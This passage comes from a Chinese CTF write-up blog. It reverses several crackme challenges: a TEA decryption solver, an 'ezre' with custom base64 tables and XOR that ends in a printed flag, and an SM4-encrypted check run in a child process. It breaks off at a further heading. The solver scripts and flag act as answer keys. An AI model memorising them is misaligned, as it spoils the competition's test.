cipher[<span class="number">0</span>] -= ((((cipher[<span class="number">1</span>] &lt;&lt; <span class="number">5</span>) ^ (cipher[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)) + cipher[<span class="number">1</span>]) &amp; <span class="number">0xffffffff</span>) ^ (num + key[num &amp; <span class="number">3</span>]) ^ num</span><br><span class="line">            cipher[<span class="number">0</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;8I&#x27;</span>, <span class="built_in">bytearray</span>(result)))</span><br><span class="line">key = [<span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>]</span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>):</span><br><span class="line">    content += tea_dec(c[i:i + <span class="number">2</span>], key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">    flag += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, content[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(flag))</span><br></pre></td></tr></table></figure>

<h2 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h2><p>放在强网先锋的ezre。</p>
<p>混淆给D8秒了，得到代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the CTF world:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">const</span> <span class="type">char</span> *, ...))__isoc99_scanf)(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    v16 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    base64((__int64)s, (__int64)v11, v3);</span><br><span class="line">    <span class="keyword">while</span> ( v10 &lt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        srand(byte_406132);</span><br><span class="line">        v4 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> <span class="type">int</span>)table);</span><br><span class="line">        change_table((__int64)table, v4);</span><br><span class="line">        <span class="keyword">if</span> ( (v10 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v5 = <span class="built_in">strlen</span>(v11);</span><br><span class="line">            base64((__int64)v11, (__int64)v12, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            base64decode((__int64)v11, (__int64)v12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">50uLL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(v11, v12, <span class="number">50uLL</span>);</span><br><span class="line">        ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4062C0 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        revser_table((__int64)table, (__int64)&amp;table[<span class="number">64</span>]);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">            table[i] = (<span class="number">5</span> * (table[i] + <span class="number">3</span>)) ^ <span class="number">0x15</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">            table[j] ^= <span class="number">0x27</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401EB0(v12, v13);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( k &gt;= <span class="built_in">strlen</span>(v12) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( byte_406180[k] != v13[k] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_401EB0</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *output)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    s = input;</span><br><span class="line">    output_ = output;</span><br><span class="line">    v8 = <span class="built_in">strlen</span>(input);</span><br><span class="line">    v7 = <span class="number">2023</span>;</span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">    <span class="built_in">strncpy</span>(v5, &amp;table[<span class="number">6</span>], <span class="number">0x15</span>uLL);</span><br><span class="line">    v5[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(output_, s);</span><br><span class="line">    <span class="keyword">while</span> ( index &lt; v8 - <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( index % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = (v7 + <span class="number">5</span>) % <span class="number">20</span>;</span><br><span class="line">            v3 = v5[v7 + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( index % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = (v7 + <span class="number">7</span>) % <span class="number">19</span>;</span><br><span class="line">            v3 = v5[v7 + <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            v7 = (v7 + <span class="number">3</span>) % <span class="number">17</span>;</span><br><span class="line">            v3 = v5[v7 + <span class="number">3</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        output_[index] ^= v3;</span><br><span class="line">        v4 = output_[index++];</span><br><span class="line">        output_[index] ^= v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>.init_array</code>有反调试，影响<code>main</code>里的一些操作：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231217112215405.png"></p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231217112236552.png"></p>
<p>只用关注红框的就好了。</p>
<p>脚本：</p>
<p>变换的base64表在linux环境下执行以下代码就可以得到了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">result = [<span class="number">0x3A</span>, <span class="number">0x2C</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x46</span>, <span class="number">0x59</span>, <span class="number">0x63</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x2B</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0x5C</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x7F</span>, <span class="number">0x3D</span>, <span class="number">0x2C</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x4D</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x2B</span>, <span class="number">0x05</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x55</span>, <span class="number">0x24</span>, <span class="number">0x19</span>]</span><br><span class="line">base64table0 = <span class="string">&quot;l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr&quot;</span></span><br><span class="line">base64table1 = <span class="string">&quot;FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8&quot;</span></span><br><span class="line">base64table2 = <span class="string">&quot;Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA&quot;</span></span><br><span class="line">base64table3 = <span class="string">&quot;pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a&quot;</span></span><br><span class="line">base64table4 = <span class="string">&quot;plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6&quot;</span></span><br><span class="line">base64table5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base64table4)):</span><br><span class="line">    base64table5.append(<span class="built_in">ord</span>(base64table4[i]) ^ <span class="number">0x27</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec1</span>(<span class="params"><span class="built_in">input</span>, table</span>):</span><br><span class="line">    v7 = <span class="number">2023</span></span><br><span class="line">    v5 = table[<span class="number">6</span>:<span class="number">6</span>+<span class="number">0x15</span>] + [<span class="number">0</span>] * (<span class="number">0x32</span> - <span class="number">21</span>)</span><br><span class="line">    v5[<span class="number">21</span>] = <span class="number">0</span></span><br><span class="line">    xor_num = []    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            v7 = (v7 + <span class="number">5</span>) % <span class="number">20</span></span><br><span class="line">            xor_num.append(v5[v7 + <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            v7 = (v7 + <span class="number">7</span>) % <span class="number">19</span></span><br><span class="line">            xor_num.append(v5[v7 + <span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v7 = (v7 + <span class="number">3</span>) % <span class="number">17</span></span><br><span class="line">            xor_num.append(v5[v7 + <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">input</span>[i + <span class="number">1</span>] ^= <span class="built_in">input</span>[i]</span><br><span class="line">        <span class="built_in">input</span>[i] ^= xor_num[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params"><span class="built_in">input</span>, new_table</span>):</span><br><span class="line">    STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    CUSTOM_ALPHABET = new_table.encode()</span><br><span class="line">    ENCODE_TRANS = <span class="built_in">bytes</span>.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="built_in">input</span>).translate(ENCODE_TRANS)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params"><span class="built_in">input</span>, new_table</span>):</span><br><span class="line">    STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    CUSTOM_ALPHABET = new_table.encode()</span><br><span class="line">    DECODE_TRANS = <span class="built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(<span class="built_in">input</span>.translate(DECODE_TRANS))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc2</span>():</span><br><span class="line">    v11, v12 = <span class="built_in">input</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">    v11 = base64.b64encode(v11)</span><br><span class="line">    v11 = base64.b64decode(v11)</span><br><span class="line">    v11 = base64.b64encode(v11)</span><br><span class="line">    v11 = base64.b64decode(v11)</span><br><span class="line">    v11 = base64.b64encode(v11)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec2</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="built_in">input</span> = decode(<span class="built_in">input</span>, base64table4)</span><br><span class="line">    <span class="built_in">input</span> = encode(<span class="built_in">input</span>, base64table3)</span><br><span class="line">    <span class="built_in">input</span> = decode(<span class="built_in">input</span>, base64table2)</span><br><span class="line">    <span class="built_in">input</span> = encode(<span class="built_in">input</span>, base64table1)</span><br><span class="line">    <span class="built_in">input</span> = decode(<span class="built_in">input</span>, base64table0)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = dec1(result, base64table5)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytearray</span>(a))</span><br><span class="line">    <span class="built_in">print</span>(dec2(<span class="built_in">bytearray</span>(a)))</span><br><span class="line">    <span class="comment"># b&#x27;flag&#123;3ea590ccwxehg715264fzxnzepqz&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="ezre-1"><a href="#ezre-1" class="headerlink" title="ezre"></a>ezre</h2><p>放在逆向的ezre。</p>
<p>混淆同样是D8秒了，我的神。</p>
<p>main里面啥也不是，程序开了子进程，猜测是获取输入，在另一个进程里加密。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_39F0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    ... </span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    ptrace(PTRACE_GETREGS, a1, <span class="number">0LL</span>, (<span class="type">char</span> *)&amp;stat_loc.__iptr + <span class="number">4</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x1D</span>uLL);</span><br><span class="line">    sub_3270(a1, v7, ptr, <span class="number">29LL</span>);  <span class="comment">// 猜测是获取另一个进程的输入</span></span><br><span class="line">    sub_3580(ptr, <span class="number">29LL</span>); <span class="comment">// 加密</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">sub_3580</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    _BOOL4 v1; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v2; <span class="comment">// bl</span></span><br><span class="line">    <span class="type">size_t</span> v4; <span class="comment">// [rsp+38h] [rbp-C8h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">    __int64 v7[<span class="number">4</span>]; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">    __int64 v8[<span class="number">2</span>]; <span class="comment">// [rsp+A0h] [rbp-60h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+B0h] [rbp-50h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+F0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">    <span class="comment">// SM4特征</span></span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="number">0x7C88631647197506</span>LL;</span><br><span class="line">    v7[<span class="number">1</span>] = <span class="number">0x4A0D7D3FFF55668B</span>LL;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">0xDEC2E93F384ED2F5</span>LL;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">0x3C1FB1746F7F7CDB</span>LL;</span><br><span class="line">    v4 = <span class="number">16</span> * (<span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    v1 = (<span class="built_in">strlen</span>(a1) &amp; <span class="number">0xF</span>) != <span class="number">0</span>;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    sub_2220(v2, v8, a1, s);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt;= <span class="number">16</span> * v1 + (<span class="type">int</span>)v4 )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *((<span class="type">unsigned</span> __int8 *)v7 + i) != (<span class="type">unsigned</span> __int8)s[i] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2220</span><span class="params">(<span class="type">unsigned</span> __int8 input_len, __int64 key, __int64 input, __int64 output)</span></span><br><span class="line">&#123;</span><br><span class="line">	... </span><br><span class="line">    v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x32</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(enc_key, <span class="number">0</span>, <span class="keyword">sizeof</span>(enc_key));</span><br><span class="line">    <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="number">0x120</span>uLL);</span><br><span class="line">    <span class="number">4</span>char_to_1int(key, &amp;s);</span><br><span class="line">    <span class="number">4</span>char_to_1int(key + <span class="number">4</span>, &amp;v22);</span><br><span class="line">    <span class="number">4</span>char_to_1int(key + <span class="number">8</span>, &amp;v23);</span><br><span class="line">    <span class="number">4</span>char_to_1int(key + <span class="number">12</span>, &amp;v24);</span><br><span class="line">    enc_key[<span class="number">0</span>] = s ^ <span class="number">0xA3B1BAC6</span>LL;</span><br><span class="line">    enc_key[<span class="number">1</span>] = v22 ^ <span class="number">0x56AA3350</span>;</span><br><span class="line">    enc_key[<span class="number">2</span>] = v23 ^ <span class="number">0x677D9197</span>;</span><br><span class="line">    enc_key[<span class="number">3</span>] = v24 ^ <span class="number">0xB27022DC</span>LL;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )                    <span class="comment">// 子密钥</span></span><br><span class="line">    &#123;</span><br><span class="line">        v6 = enc_key[i];</span><br><span class="line">        enc_key[i + <span class="number">4</span>] = sub_16F0(qword_6030[i] ^ enc_key[i + <span class="number">3</span>] ^ enc_key[i + <span class="number">2</span>] ^ enc_key[i + <span class="number">1</span>]) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; input_len; ++j )</span><br><span class="line">        ptr[j] = *(_BYTE *)(input + j);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">16</span> - input_len % <span class="number">16</span>; ++k )   <span class="comment">// 补齐</span></span><br><span class="line">        ptr[input_len + k] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; (input_len % <span class="number">16</span> != <span class="number">0</span>) + input_len / <span class="number">16</span>; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">4</span>char_to_1int((__int64)&amp;ptr[<span class="number">16</span> * m], v15);</span><br><span class="line">        <span class="number">4</span>char_to_1int((__int64)&amp;ptr[<span class="number">16</span> * m + <span class="number">4</span>], &amp;v15[<span class="number">1</span>]);</span><br><span class="line">        <span class="number">4</span>char_to_1int((__int64)&amp;ptr[<span class="number">16</span> * m + <span class="number">8</span>], &amp;v15[<span class="number">2</span>]);</span><br><span class="line">        <span class="number">4</span>char_to_1int((__int64)&amp;ptr[<span class="number">16</span> * m + <span class="number">12</span>], &amp;v15[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">32</span>; ++n )</span><br><span class="line">        &#123;</span><br><span class="line">            v5 = v15[n];</span><br><span class="line">            v15[n + <span class="number">4</span>] = sub_1BC0(enc_key[n + <span class="number">4</span>] ^ v15[n + <span class="number">3</span>] ^ v15[n + <span class="number">2</span>] ^ v15[n + <span class="number">1</span>]) ^ v5;</span><br><span class="line">        &#125;                                           <span class="comment">// 最后四轮溢出覆盖到19、18、17、16</span></span><br><span class="line">        sub_13A0(v19, <span class="number">16</span> * m + output); <span class="comment">// int2byte</span></span><br><span class="line">        sub_13A0(v18, <span class="number">16</span> * m + output + <span class="number">4</span>);</span><br><span class="line">        sub_13A0(v17, <span class="number">16</span> * m + output + <span class="number">8</span>);</span><br><span class="line">        sub_13A0(v16, <span class="number">16</span> * m + output + <span class="number">12</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> v25;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有密钥和密文，<a target="_blank" rel="noopener" href="https://bkssl.com/ssl/sm4">国密SM4在线加密&#x2F;解密</a></p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231217124608839.png"></p>
<h2 id="dotdot"><a href="#dotdot" class="headerlink" title="dotdot"></a>dotdot</h2><p><code>ILSpy</code>打开(<code>dnspy</code>看不到数据)：</p>
